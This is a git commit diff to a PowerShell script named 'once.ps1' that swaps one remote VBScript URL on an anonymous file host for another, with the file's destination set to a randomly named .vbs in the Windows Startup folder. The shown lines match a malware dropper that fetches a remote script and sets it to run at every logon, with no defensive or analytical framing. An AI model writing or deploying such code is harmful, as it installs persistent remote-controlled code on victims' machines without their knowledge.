7632a118beb8df29b3f45991c01e07fec4ddca97
anaprivate <anathike4@gmail.com>
2025-02-10 18:53:38 +0000

    Update once.ps1

--- once.ps1
+++ once.ps1
@@ -1,4 +1,4 @@
-$url = "https://files.catbox.moe/0esiva.vbs"
+$url = "https://files.catbox.moe/txqdie.vbs"
 $destination = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\9lepqn.vbs"
 
 
